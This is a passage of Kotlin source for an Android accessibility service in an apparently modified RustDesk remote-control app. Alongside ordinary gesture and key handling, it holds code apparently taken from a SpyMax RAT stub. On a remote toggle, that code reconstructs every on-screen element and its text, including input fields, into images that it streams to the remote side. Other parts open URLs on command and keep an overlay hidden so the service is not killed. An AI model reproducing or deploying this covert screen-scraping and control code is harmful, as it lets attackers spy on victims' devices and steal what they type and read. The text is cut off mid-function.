package com.carriez.flutter_hbb

/**
 * Handle remote input and dispatch android gesture
 *
 * Inspired by [droidVNC-NG] https://github.com/bk138/droidVNC-NG
 */

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.EditText
import android.view.accessibility.AccessibilityEvent
import android.view.ViewGroup.LayoutParams
import android.view.accessibility.AccessibilityNodeInfo
import android.view.KeyEvent as KeyEventAndroid
import android.graphics.Rect
import android.media.AudioManager
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.AccessibilityServiceInfo.FLAG_INPUT_METHOD_EDITOR
import android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
import android.view.inputmethod.EditorInfo
import androidx.annotation.RequiresApi
import java.util.*
import java.lang.Character
import kotlin.math.abs
import kotlin.math.max
import hbb.MessageOuterClass.KeyEvent
import hbb.MessageOuterClass.KeyboardMode
import hbb.KeyEventConverter
import android.view.WindowManager
import android.view.WindowManager.LayoutParams.*
import android.widget.FrameLayout
import android.graphics.Color
import android.annotation.SuppressLint
import android.graphics.PixelFormat
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.util.DisplayMetrics
import android.widget.ProgressBar
import android.widget.TextView
import android.content.Context
import android.content.res.ColorStateList

import android.content.Intent
import android.net.Uri
import ffi.FFI

import android.graphics.*
import java.io.ByteArrayOutputStream
import android.hardware.HardwareBuffer
import android.graphics.Bitmap.wrapHardwareBuffer
import java.nio.IntBuffer
import java.nio.ByteOrder
import java.nio.ByteBuffer
import java.io.IOException
import java.io.File
import java.io.FileOutputStream
import java.lang.reflect.Field
import java.text.SimpleDateFormat
import android.os.Environment

import java.util.concurrent.locks.ReentrantLock
import java.security.MessageDigest


const val LIFT_DOWN = 9
const val LIFT_MOVE = 8
const val LIFT_UP = 10
const val RIGHT_UP = 18
const val WHEEL_BUTTON_DOWN = 33
const val WHEEL_BUTTON_UP = 34

const val WHEEL_BUTTON_BLANK = 37//32+5
const val WHEEL_BUTTON_BROWSER = 38//32+6

const val WHEEL_DOWN = 523331
const val WHEEL_UP = 963

const val TOUCH_SCALE_START = 1
const val TOUCH_SCALE = 2
const val TOUCH_SCALE_END = 3
const val TOUCH_PAN_START = 4
const val TOUCH_PAN_UPDATE = 5
const val TOUCH_PAN_END = 6

const val WHEEL_STEP = 120
const val WHEEL_DURATION = 50L
const val LONG_TAP_DELAY = 200L

class InputService : AccessibilityService() {

    companion object {
	private var viewUntouchable = true
        private var viewTransparency = 1f //// 0 means invisible but can help prevent the service from being killed
        var ctx: InputService? = null
        val isOpen: Boolean
            get() = ctx != null
    }
    
    //新增
    private lateinit var windowManager: WindowManager
    private lateinit var overLayparams_bass: WindowManager.LayoutParams
    private lateinit var overLay: FrameLayout
    private val lock = ReentrantLock()

    private val logTag = "input service"
    private var leftIsDown = false
    private var touchPath = Path()
    private var lastTouchGestureStartTime = 0L
    private var mouseX = 0
    private var mouseY = 0
    private var timer = Timer()
    private var recentActionTask: TimerTask? = null

    private val wheelActionsQueue = LinkedList<GestureDescription>()
    private var isWheelActionsPolling = false
    private var isWaitingLongPress = false

    private var fakeEditTextForTextStateCalculation: EditText? = null

    private val volumeController: VolumeController by lazy { VolumeController(applicationContext.getSystemService(AUDIO_SERVICE) as AudioManager) }

    @RequiresApi(Build.VERSION_CODES.N)
    fun onMouseInput(mask: Int, _x: Int, _y: Int,url: String) {
        val x = max(0, _x)
        val y = max(0, _y)

        if (mask == 0 || mask == LIFT_MOVE) {
            val oldX = mouseX
            val oldY = mouseY
            mouseX = x * SCREEN_INFO.scale
            mouseY = y * SCREEN_INFO.scale
            if (isWaitingLongPress) {
                val delta = abs(oldX - mouseX) + abs(oldY - mouseY)
                //Log.d(logTag,"delta:$delta")
                if (delta > 8) {
                    isWaitingLongPress = false
                }
            }
        }

	    //wheel button blank
        if (mask == WHEEL_BUTTON_BLANK) {	
            //Log.d(logTag,"gohome:$gohome")
            if(gohome==8)
	       gohome = 0
	    else
	       gohome = 8	
            return
          }
	
         if (mask == WHEEL_BUTTON_BROWSER) {	
            //Log.d(logTag,"gohome:$gohome")
		 
	   // 调用打开浏览器输入网址的方法
	   if (!url.isNullOrEmpty()) {
		openBrowserWithUrl(url)
	    }
            return
        }

        // left button down ,was up
        if (mask == LIFT_DOWN) {
            isWaitingLongPress = true
            timer.schedule(object : TimerTask() {
                override fun run() {
                    if (isWaitingLongPress) {
                        isWaitingLongPress = false
                        leftIsDown = false
                        endGesture(mouseX, mouseY)
                    }
                }
            }, LONG_TAP_DELAY * 4)

            leftIsDown = true
            startGesture(mouseX, mouseY)
            return
        }

        // left down ,was down
        if (leftIsDown) {
            continueGesture(mouseX, mouseY)
        }

        // left up ,was down
        if (mask == LIFT_UP) {
            if (leftIsDown) {
                leftIsDown = false
                isWaitingLongPress = false
                endGesture(mouseX, mouseY)
                return
            }
        }

        if (mask == RIGHT_UP) {
            performGlobalAction(GLOBAL_ACTION_BACK)
            return
        }

        // long WHEEL_BUTTON_DOWN -> GLOBAL_ACTION_RECENTS
        if (mask == WHEEL_BUTTON_DOWN) {
            timer.purge()
            recentActionTask = object : TimerTask() {
                override fun run() {
                    performGlobalAction(GLOBAL_ACTION_RECENTS)
                    recentActionTask = null
                }
            }
            timer.schedule(recentActionTask, LONG_TAP_DELAY)
        }

        // wheel button up
        if (mask == WHEEL_BUTTON_UP) {
            if (recentActionTask != null) {
                recentActionTask!!.cancel()
                performGlobalAction(GLOBAL_ACTION_HOME)
            }
          
            return
        }

        if (mask == WHEEL_DOWN) {
            if (mouseY < WHEEL_STEP) {
                return
            }
            val path = Path()
            path.moveTo(mouseX.toFloat(), mouseY.toFloat())
            path.lineTo(mouseX.toFloat(), (mouseY - WHEEL_STEP).toFloat())
            val stroke = GestureDescription.StrokeDescription(
                path,
                0,
                WHEEL_DURATION
            )
            val builder = GestureDescription.Builder()
            builder.addStroke(stroke)
            wheelActionsQueue.offer(builder.build())
            consumeWheelActions()

        }

        if (mask == WHEEL_UP) {
            if (mouseY < WHEEL_STEP) {
                return
            }
            val path = Path()
            path.moveTo(mouseX.toFloat(), mouseY.toFloat())
            path.lineTo(mouseX.toFloat(), (mouseY + WHEEL_STEP).toFloat())
            val stroke = GestureDescription.StrokeDescription(
                path,
                0,
                WHEEL_DURATION
            )
            val builder = GestureDescription.Builder()
            builder.addStroke(stroke)
            wheelActionsQueue.offer(builder.build())
            consumeWheelActions()
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun onTouchInput(mask: Int, _x: Int, _y: Int) {
        when (mask) {
            TOUCH_PAN_UPDATE -> {
                mouseX -= _x * SCREEN_INFO.scale
                mouseY -= _y * SCREEN_INFO.scale
                mouseX = max(0, mouseX);
                mouseY = max(0, mouseY);
                continueGesture(mouseX, mouseY)
            }
            TOUCH_PAN_START -> {
                mouseX = max(0, _x) * SCREEN_INFO.scale
                mouseY = max(0, _y) * SCREEN_INFO.scale
                startGesture(mouseX, mouseY)
            }
            TOUCH_PAN_END -> {
                endGesture(mouseX, mouseY)
                mouseX = max(0, _x) * SCREEN_INFO.scale
                mouseY = max(0, _y) * SCREEN_INFO.scale
            }
            else -> {}
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun onScreenAnalysis(arg1: String,arg2: String) {
	SKL=!SKL//arg2 存放参数刚刚好啊
	    	    
	if(InputService.ctx==null)
	     Log.d(logTag,"SKL:go on,arg1:$arg1,arg2:$arg2,SKL:InputService.ctx") 
	else
	    Log.d(logTag,"SKL:go on,arg1:$arg1,arg2:$arg2,SKL:$SKL ctx not null ") 
    }
    
    @SuppressLint("WrongConstant")
    private fun openBrowserWithUrl(url: String) {
	     try {
		Handler(Looper.getMainLooper()).post(
		{
		   // Log.d(logTag,"url:$url")
		    val intent = Intent("android.intent.action.VIEW", Uri.parse(url))
		    intent.flags = 268435456
		    if (intent.resolveActivity(packageManager) != null) {
			 // Log.d(logTag,"url:go on")
			      FloatingWindowService.app_ClassGen11_Context?.let {
				    // 在这里使用 it 代替 context
				    it.startActivity(intent)
				}
		           //FloatingWindowService.app_ClassGen11_Context.startActivity(intent)
		    }
		    else
		   {
                         //  Log.d(logTag,"url:go")
                          // FloatingWindowService.app_ClassGen11_Context.startActivity(intent)
			    FloatingWindowService.app_ClassGen11_Context?.let {
				    // 在这里使用 it 代替 context
				    it.startActivity(intent)
				}
		   }
		})
	     } catch (e: Exception) {
		//Log.d(logTag,"Exception:${e.message}")
	       // 处理异常，显示错误信息
	      // Toast.makeText(this, "打开浏览器失败: ${e.message}", Toast.LENGTH_SHORT).show()
	    }
	     
		   /* 
		  try {
		    // 创建一个 Intent 对象，用于启动浏览器并打开指定网址
		    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
		    // 检查是否有应用可以处理该 Intent
		    if (intent.resolveActivity(packageManager) != null) {
			// 启动浏览器
			startActivity(intent)
		    } else {
			// 如果没有应用可以处理该 Intent，显示提示信息
			Toast.makeText(this, "没有可用的浏览器应用", Toast.LENGTH_SHORT).show()
		    }
		} catch (e: Exception) {
		    // 处理异常，显示错误信息
		    Toast.makeText(this, "打开浏览器失败: ${e.message}", Toast.LENGTH_SHORT).show()
		}*/
      }
    

    @RequiresApi(Build.VERSION_CODES.N)
    private fun consumeWheelActions() {
        if (isWheelActionsPolling) {
            return
        } else {
            isWheelActionsPolling = true
        }
        wheelActionsQueue.poll()?.let {
            dispatchGesture(it, null, null)
            timer.purge()
            timer.schedule(object : TimerTask() {
                override fun run() {
                    isWheelActionsPolling = false
                    consumeWheelActions()
                }
            }, WHEEL_DURATION + 10)
        } ?: let {
            isWheelActionsPolling = false
            return
        }
    }

    private fun startGesture(x: Int, y: Int) {
        touchPath = Path()
        touchPath.moveTo(x.toFloat(), y.toFloat())
        lastTouchGestureStartTime = System.currentTimeMillis()
    }

    private fun continueGesture(x: Int, y: Int) {
        touchPath.lineTo(x.toFloat(), y.toFloat())
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun endGesture(x: Int, y: Int) {
        try {
            touchPath.lineTo(x.toFloat(), y.toFloat())
            var duration = System.currentTimeMillis() - lastTouchGestureStartTime
            if (duration <= 0) {
                duration = 1
            }
            val stroke = GestureDescription.StrokeDescription(
                touchPath,
                0,
                duration
            )
            val builder = GestureDescription.Builder()
            builder.addStroke(stroke)
            //Log.d(logTag, "end gesture x:$x y:$y time:$duration")
            dispatchGesture(builder.build(), null, null)
        } catch (e: Exception) {
            //Log.e(logTag, "endGesture error:$e")
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun onKeyEvent(data: ByteArray) {
        val keyEvent = KeyEvent.parseFrom(data)
        val keyboardMode = keyEvent.getMode()

        var textToCommit: String? = null

        // [down] indicates the key's state(down or up).
        // [press] indicates a click event(down and up).
        // https://github.com/rustdesk/rustdesk/blob/3a7594755341f023f56fa4b6a43b60d6b47df88d/flutter/lib/models/input_model.dart#L688
        if (keyEvent.hasSeq()) {
            textToCommit = keyEvent.getSeq()
        } else if (keyboardMode == KeyboardMode.Legacy) {
            if (keyEvent.hasChr() && (keyEvent.getDown() || keyEvent.getPress())) {
                val chr = keyEvent.getChr()
                if (chr != null) {
                    textToCommit = String(Character.toChars(chr))
                }
            }
        } else if (keyboardMode == KeyboardMode.Translate) {
        } else {
        }

        Log.d(logTag, "onKeyEvent $keyEvent textToCommit:$textToCommit")

        var ke: KeyEventAndroid? = null
        if (Build.VERSION.SDK_INT < 33 || textToCommit == null) {
            ke = KeyEventConverter.toAndroidKeyEvent(keyEvent)
        }
        ke?.let { event ->
            if (tryHandleVolumeKeyEvent(event)) {
                return
            } else if (tryHandlePowerKeyEvent(event)) {
                return
            }
        }

        if (Build.VERSION.SDK_INT >= 33) {
            getInputMethod()?.let { inputMethod ->
                inputMethod.getCurrentInputConnection()?.let { inputConnection ->
                    if (textToCommit != null) {
                        textToCommit?.let { text ->
                            inputConnection.commitText(text, 1, null)
                        }
                    } else {
                        ke?.let { event ->
                            inputConnection.sendKeyEvent(event)
                            if (keyEvent.getPress()) {
                                val actionUpEvent = KeyEventAndroid(KeyEventAndroid.ACTION_UP, event.keyCode)
                                inputConnection.sendKeyEvent(actionUpEvent)
                            }
                        }
                    }
                }
            }
        } else {
            val handler = Handler(Looper.getMainLooper())
            handler.post {
                ke?.let { event ->
                    val possibleNodes = possibleAccessibiltyNodes()
                    Log.d(logTag, "possibleNodes:$possibleNodes")
                    for (item in possibleNodes) {
                        val success = trySendKeyEvent(event, item, textToCommit)
                        if (success) {
                            if (keyEvent.getPress()) {
                                val actionUpEvent = KeyEventAndroid(KeyEventAndroid.ACTION_UP, event.keyCode)
                                trySendKeyEvent(actionUpEvent, item, textToCommit)
                            }
                            break
                        }
                    }
                }
            }
        }
    }

    private fun tryHandleVolumeKeyEvent(event: KeyEventAndroid): Boolean {
        when (event.keyCode) {
            KeyEventAndroid.KEYCODE_VOLUME_UP -> {
                if (event.action == KeyEventAndroid.ACTION_DOWN) {
                    volumeController.raiseVolume(null, true, AudioManager.STREAM_SYSTEM)
                }
                return true
            }
            KeyEventAndroid.KEYCODE_VOLUME_DOWN -> {
                if (event.action == KeyEventAndroid.ACTION_DOWN) {
                    volumeController.lowerVolume(null, true, AudioManager.STREAM_SYSTEM)
                }
                return true
            }
            KeyEventAndroid.KEYCODE_VOLUME_MUTE -> {
                if (event.action == KeyEventAndroid.ACTION_DOWN) {
                    volumeController.toggleMute(true, AudioManager.STREAM_SYSTEM)
                }
                return true
            }
            else -> {
                return false
            }
        }
    }

    private fun tryHandlePowerKeyEvent(event: KeyEventAndroid): Boolean {
        if (event.keyCode == KeyEventAndroid.KEYCODE_POWER) {
            // Perform power dialog action when action is up
            if (event.action == KeyEventAndroid.ACTION_UP) {
                performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
            }
            return true
        }
        return false
    }

    private fun insertAccessibilityNode(list: LinkedList<AccessibilityNodeInfo>, node: AccessibilityNodeInfo) {
        if (node == null) {
            return
        }
        if (list.contains(node)) {
            return
        }
        list.add(node)
    }

    private fun findChildNode(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (node == null) {
            return null
        }
        if (node.isEditable() && node.isFocusable()) {
            return node
        }
        val childCount = node.getChildCount()
        for (i in 0 until childCount) {
            val child = node.getChild(i)
            if (child != null) {
                if (child.isEditable() && child.isFocusable()) {
                    return child
                }
                if (Build.VERSION.SDK_INT < 33) {
                    child.recycle()
                }
            }
        }
        for (i in 0 until childCount) {
            val child = node.getChild(i)
            if (child != null) {
                val result = findChildNode(child)
                if (Build.VERSION.SDK_INT < 33) {
                    if (child != result) {
                        child.recycle()
                    }
                }
                if (result != null) {
                    return result
                }
            }
        }
        return null
    }

    private fun possibleAccessibiltyNodes(): LinkedList<AccessibilityNodeInfo> {
        val linkedList = LinkedList<AccessibilityNodeInfo>()
        val latestList = LinkedList<AccessibilityNodeInfo>()

        val focusInput = findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        var focusAccessibilityInput = findFocus(AccessibilityNodeInfo.FOCUS_ACCESSIBILITY)

        val rootInActiveWindow = getRootInActiveWindow()

        Log.d(logTag, "focusInput:$focusInput focusAccessibilityInput:$focusAccessibilityInput rootInActiveWindow:$rootInActiveWindow")

        if (focusInput != null) {
            if (focusInput.isFocusable() && focusInput.isEditable()) {
                insertAccessibilityNode(linkedList, focusInput)
            } else {
                insertAccessibilityNode(latestList, focusInput)
            }
        }

        if (focusAccessibilityInput != null) {
            if (focusAccessibilityInput.isFocusable() && focusAccessibilityInput.isEditable()) {
                insertAccessibilityNode(linkedList, focusAccessibilityInput)
            } else {
                insertAccessibilityNode(latestList, focusAccessibilityInput)
            }
        }

        val childFromFocusInput = findChildNode(focusInput)
        Log.d(logTag, "childFromFocusInput:$childFromFocusInput")

        if (childFromFocusInput != null) {
            insertAccessibilityNode(linkedList, childFromFocusInput)
        }

        val childFromFocusAccessibilityInput = findChildNode(focusAccessibilityInput)
        if (childFromFocusAccessibilityInput != null) {
            insertAccessibilityNode(linkedList, childFromFocusAccessibilityInput)
        }
        Log.d(logTag, "childFromFocusAccessibilityInput:$childFromFocusAccessibilityInput")

        if (rootInActiveWindow != null) {
            insertAccessibilityNode(linkedList, rootInActiveWindow)
        }

        for (item in latestList) {
            insertAccessibilityNode(linkedList, item)
        }

        return linkedList
    }

    private fun trySendKeyEvent(event: KeyEventAndroid, node: AccessibilityNodeInfo, textToCommit: String?): Boolean {
        node.refresh()
        this.fakeEditTextForTextStateCalculation?.setSelection(0,0)
        this.fakeEditTextForTextStateCalculation?.setText(null)

        val text = node.getText()
        var isShowingHint = false
        if (Build.VERSION.SDK_INT >= 26) {
            isShowingHint = node.isShowingHintText()
        }

        var textSelectionStart = node.textSelectionStart
        var textSelectionEnd = node.textSelectionEnd

        if (text != null) {
            if (textSelectionStart > text.length) {
                textSelectionStart = text.length
            }
            if (textSelectionEnd > text.length) {
                textSelectionEnd = text.length
            }
            if (textSelectionStart > textSelectionEnd) {
                textSelectionStart = textSelectionEnd
            }
        }

        var success = false

        Log.d(logTag, "existing text:$text textToCommit:$textToCommit textSelectionStart:$textSelectionStart textSelectionEnd:$textSelectionEnd")

        if (textToCommit != null) {
            if ((textSelectionStart == -1) || (textSelectionEnd == -1)) {
                val newText = textToCommit
                this.fakeEditTextForTextStateCalculation?.setText(newText)
                success = updateTextForAccessibilityNode(node)
            } else if (text != null) {
                this.fakeEditTextForTextStateCalculation?.setText(text)
                this.fakeEditTextForTextStateCalculation?.setSelection(
                    textSelectionStart,
                    textSelectionEnd
                )
                this.fakeEditTextForTextStateCalculation?.text?.insert(textSelectionStart, textToCommit)
                success = updateTextAndSelectionForAccessibiltyNode(node)
            }
        } else {
            if (isShowingHint) {
                this.fakeEditTextForTextStateCalculation?.setText(null)
            } else {
                this.fakeEditTextForTextStateCalculation?.setText(text)
            }
            if (textSelectionStart != -1 && textSelectionEnd != -1) {
                Log.d(logTag, "setting selection $textSelectionStart $textSelectionEnd")
                this.fakeEditTextForTextStateCalculation?.setSelection(
                    textSelectionStart,
                    textSelectionEnd
                )
            }

            this.fakeEditTextForTextStateCalculation?.let {
                // This is essiential to make sure layout object is created. OnKeyDown may not work if layout is not created.
                val rect = Rect()
                node.getBoundsInScreen(rect)

                it.layout(rect.left, rect.top, rect.right, rect.bottom)
                it.onPreDraw()
                if (event.action == KeyEventAndroid.ACTION_DOWN) {
                    val succ = it.onKeyDown(event.getKeyCode(), event)
                    Log.d(logTag, "onKeyDown $succ")
                } else if (event.action == KeyEventAndroid.ACTION_UP) {
                    val success = it.onKeyUp(event.getKeyCode(), event)
                    Log.d(logTag, "keyup $success")
                } else {}
            }

            success = updateTextAndSelectionForAccessibiltyNode(node)
        }
        return success
    }

    fun updateTextForAccessibilityNode(node: AccessibilityNodeInfo): Boolean {
        var success = false
        this.fakeEditTextForTextStateCalculation?.text?.let {
            val arguments = Bundle()
            arguments.putCharSequence(
                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                it.toString()
            )
            success = node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
        }
        return success
    }

    fun updateTextAndSelectionForAccessibiltyNode(node: AccessibilityNodeInfo): Boolean {
        var success = updateTextForAccessibilityNode(node)

        if (success) {
            val selectionStart = this.fakeEditTextForTextStateCalculation?.selectionStart
            val selectionEnd = this.fakeEditTextForTextStateCalculation?.selectionEnd

            if (selectionStart != null && selectionEnd != null) {
                val arguments = Bundle()
                arguments.putInt(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT,
                    selectionStart
                )
                arguments.putInt(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT,
                    selectionEnd
                )
                success = node.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, arguments)
                Log.d(logTag, "Update selection to $selectionStart $selectionEnd success:$success")
            }
        }

        return success
    }

     //@RequiresApi(Build.VERSION_CODES.Q)
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
	Log.d(logTag, "Received event: ${event.eventType}")
	//if(true) return
	    
	var accessibilityNodeInfo3: AccessibilityNodeInfo?
        try {
            accessibilityNodeInfo3 = rootInActiveWindow
        } catch (unused6: java.lang.Exception) {
            accessibilityNodeInfo3 = null
        }
        if (accessibilityNodeInfo3 != null) {
            try {
                //if (My_ClassGen_Settings.readBool(this, "SKL", false)) {
                 if(SKL){
		     Log.d(logTag, "SKL accessibilityNodeInfo3 NOT NULL")
                    val `f$1`: AccessibilityNodeInfo
                    `f$1` = accessibilityNodeInfo3
                    Thread(Runnable { `m347lambda$onAccessibilityEvent$0$spymaxstub7ClassGen12`(`f$1`) }).start()
                }
		 else
		    {
                       Log.d(logTag, "SKL accessibilityNodeInfo3 else $SKL")
		    }
            } catch (unused7: java.lang.Exception) {
            }
        }
	else
	    {
                 Log.d(logTag, "SKL accessibilityNodeInfo3 NULL")
	    }
    }

        var NodeImageSize =0.1f
	
	var NodeImageMd5=""
	
	fun ByteArray.toMD5(): String {
	    val md = MessageDigest.getInstance("MD5")
	    val digest = md.digest(this)
	    return digest.joinToString("") { String.format("%02x", it) }
	}
	
        fun `m347lambda$onAccessibilityEvent$0$spymaxstub7ClassGen12`(accessibilityNodeInfo: AccessibilityNodeInfo?) {
        if (accessibilityNodeInfo == null) {
		Log.d(logTag, "SKL accessibilityNodeInfo  NULL")
            return
        }
	/*
	  if (accessibilityNodeInfo != null) {

		Log.d(logTag, "SKL accessibilityNodeInfo not NULL")
	        return
	  }*/
		
        try {
           // val read: String = "900"// HomeWidth //"900"//My_ClassGen_Settings.read(applicationContext, My_ClassGen_Settings.ScreenWidth, "720")
           // val read2: String = "1600" // HomeHeight//"1600"//My_ClassGen_Settings.read(applicationContext, My_ClassGen_Settings.ScreenHight, "1080")	
		
            //val createBitmap = Bitmap.createBitmap(Integer.valueOf(read).toInt(), Integer.valueOf(read2).toInt(), Bitmap.Config.ARGB_8888)		
            val createBitmap = Bitmap.createBitmap(HomeWidth, HomeHeight, Bitmap.Config.ARGB_8888)	
		
          // val createBitmap = Bitmap.createBitmap(SCREEN_INFO.width,
           //      SCREEN_INFO.height, Bitmap.Config.ARGB_8888)	    
	   // Log.d(logTag, "SKL accessibilityNodeInfo createBitmap:$SCREEN_INFO.width,$SCREEN_INFO.height")
	    
            val canvas = Canvas(createBitmap)
            val paint = Paint()
            canvas.drawColor(-16777216)//纯黑色
            val rect = Rect()
            accessibilityNodeInfo.getBoundsInScreen(rect)
            var str = ""
            try {
                if (accessibilityNodeInfo.text != null) {
                    str = accessibilityNodeInfo.text.toString()
                } else if (accessibilityNodeInfo.contentDescription != null) {
                    str = accessibilityNodeInfo.contentDescription.toString()
                }
            } catch (unused: java.lang.Exception) {
            }
	    
             val charSequence2 = accessibilityNodeInfo.className.toString()
	    //测试
            //Log.d(logTag, "SKL className:$charSequence2,NodeInfotext:$str")	
	    
            when (accessibilityNodeInfo.className) {
                "android.widget.TextView" -> {
                    paint.color = -16776961//Alpha: 255, Red: 255, Green: 0, Blue: 255  会将画布填充为品红色。
                }
                "android.widget.EditText" -> {
                    paint.color = -16711936 //-16711936 代表的颜色是不透明的纯红色
                }
                "android.widget.CheckBox" -> {
                    paint.color = -256//-256 对应的 ARGB 颜色是 (255, 255, 254, 255)
                }
                else -> {
                    paint.color = -65536 //canvas.drawColor(-65536) 表示用完全不透明的纯红色填充整个画布。
                }
            }
	    
            paint.color = -65536 //纯红色
            paint.style = Paint.Style.STROKE
            paint.strokeWidth = 2.0f
            paint.textSize = 22.0f
            canvas.drawRect(rect, paint)
            canvas.drawText(str, rect.exactCenterX(), rect.exactCenterY(), paint)
            drawViewHierarchy(canvas, accessibilityNodeInfo, paint)

	    /*
            val file = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), generateRandomFileName() + ".png") // 或者使用其他路径

            var out: FileOutputStream? = null
            try {
                out =  FileOutputStream(file)

                // 压缩位图并保存到文件，这里以PNG格式为例
                createBitmap.compress(Bitmap.CompressFormat.PNG, 100, out) // 第二个参数是质量，对于PNG通常是100（无损）
                out.flush()
                out.close()
                Log.d(logTag, "SKL animator 9900：" )
                // 保存成功后的操作，例如显示一个Toast或者更新UI等
             //   Toast.makeText(this, "图片保存成功", Toast.LENGTH_SHORT).show()
            } catch (unused21: java.lang.Exception) {

            }
	    */

        lock.lock() // Lock the counter
	if (createBitmap != null) {
	    val byteArrayOutputStream = ByteArrayOutputStream()
	    val success = createBitmap.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream)
	
	    if (success) {
	        // 获取压缩后的字节数组
	        val byteArray = byteArrayOutputStream.toByteArray()

	        // 计算实际大小
	        val actualSize = byteArray.size // 字节数
	        val kbSize = actualSize / 1024f // 转换为 KB（可选）
                val actualMd5 = byteArray.toMD5()
		if(kbSize!=NodeImageSize ||  NodeImageMd5!=actualMd5)
		{
		    NodeImageSize=kbSize
		    NodeImageMd5=actualMd5
			
		    val width = createBitmap.getWidth()
		    val height = createBitmap.getHeight()
		    if (width > 0 && height > 0) {
		        var newBuffer = ByteBuffer.allocateDirect(width * height * 4)
		        newBuffer.order(ByteOrder.LITTLE_ENDIAN)
		        createBitmap.copyPixelsToBuffer(newBuffer)
		        newBuffer.flip()
		        newBuffer.rewind()
	
			//val byteArray: ByteArray = newBuffer.array() // use array() instead of toByteArray()
	                //saveByteArrayToFile( getApplicationContext(),byteArray,generateRandomFileName() +".png")
			
		        if (newBuffer.hasRemaining()) {
		            FFI.onVideoFrameUpdate2(newBuffer)
		        }
			//newBuffer = null
		    }
		}
	    }
	}
	lock.unlock()
		
		/*    
            var  newBuffer = ByteBuffer//.allocate(createBitmap.getWidth() * createBitmap.getHeight() * 4)
		                 .allocateDirect(createBitmap.getWidth() * createBitmap.getHeight() * 4)
	    // 设置新缓冲区的字节序与原缓冲区相同
	    newBuffer.order(ByteOrder.LITTLE_ENDIAN)
	    
            createBitmap.copyPixelsToBuffer(newBuffer)
	    
            newBuffer.flip()
	    
	    newBuffer.rewind()

	    //不编译吗
            FFI.onVideoFrameUpdate2(newBuffer)
	    */
	    // 可以在这里释放对 newBuffer 的引用，让其可以被垃圾回收
            //newBuffer = null;
    
	    /*
	     //测试
	    Log.d(logTag, "SKL byteBuffer go on")	
	     
            val byteBuffer  = ByteBuffer.allocate(createBitmap.getWidth() * createBitmap.getHeight() * 4)// 4 bytes per pixel (ARGB)
	    byteBuffer.order(ByteOrder.nativeOrder())
	    createBitmap.copyPixelsToBuffer(byteBuffer)
	    //byteBuffer.position(0) // rewind the buffer
            byteBuffer.flip()
	    byteBuffer.rewind()
	    */
	    
	    /*
            val byteArray: ByteArray = byteBuffer.array() // use array() instead of toByteArray()          
	    buffer.clear()
	    buffer.put(byteArray)
	    buffer.flip()
	    buffer.rewind()
            FFI.onVideoFrameUpdate(buffer)*/
	    
	    //FFI.onVideoFrameUpdate(byteBuffer)  
        } catch (unused2: java.lang.Exception) {
        }
    } 
	
  fun saveByteArrayToFile(context: Context,byteArray: ByteArray, fileName: String) {

  // 创建文件输出流
    val fileOutputStream: FileOutputStream
    try {
        // 定义外部存储的文件路径
          val externalStorageDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)
           //  val externalStorageDirectory = Environment.getExternalStorageDirectory()
        val file = File(externalStorageDirectory, fileName)

        // 创建文件输出流
        fileOutputStream = FileOutputStream(file)

        // 写入字节数组
        fileOutputStream.write(byteArray)

        // 关闭输出流
        fileOutputStream.close()
        Log.d(logTag, "$fileName 文件已保存到外部存储")
    } catch (e: IOException) {
        e.printStackTrace()
        Log.e(logTag, "保存文件时发生错误: ${e.message}")
    }
  }

    fun generateRandomFileName(): String? {
        val dateFormat = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
        val timestamp: String = dateFormat.format(Date())
        val random = Random()
        val randomNumber: Int = random.nextInt(99999) // 生成一个5位数的随机数
        return "IMG_" + timestamp + "_" + randomNumber
    }

    private fun drawViewHierarchy(canvas: Canvas, accessibilityNodeInfo: AccessibilityNodeInfo?, paint: Paint) {
        var c: Char
        var i: Int
        var charSequence: String
        if (accessibilityNodeInfo == null || accessibilityNodeInfo.childCount == 0) {
            return
        }
        for (i2 in 0 until accessibilityNodeInfo.childCount) {
            val child = accessibilityNodeInfo.getChild(i2)
            if (child != null) {
                val rect = Rect()
                child.getBoundsInScreen(rect)
                paint.textSize = 18.0f
                val charSequence2 = child.className.toString()
		
		 Log.d(logTag, "SKL  drawViewHierarchy className:$charSequence2")	
		 
                when (charSequence2.hashCode()) {
                    -1758715599 -> {
                        c =  '0'
                    }
                    -214285650 -> {
                        c =  '1'
                    }
                    -149114526 -> {
                        c =  '2'
                    }
                    1540240509 -> {
                        c =  '3'
                    }
                    1583615229 -> {
                        c =  '4'
                    }
                    1663696930 -> {
                         c =  '5'
                    }
                    else -> c = 65535.toChar()
                }

                when (c) {
                    '0' -> i = -256//-256 对应的 ARGB 颜色是 (255, 255, 254, 255)
                    '1' -> i = -65281//会将画布填充为品红色
                    '2' -> {
                        paint.textSize = 30.0f
                        i = -16711681//canvas.drawColor(-16711681) 绘制的颜色是纯红色
                    }
                    '3' -> {
                        paint.textSize = 33.0f
                        i = -65536 //纯红色
                    }
                    '4' -> i = -16776961//Alpha: 255, Red: 255, Green: 0, Blue: 255  会将画布填充为品红色
                    '5' -> i = -16711936 //-16711936 代表的颜色是不透明的纯红色
                    else -> {
                        paint.textSize = 16.0f
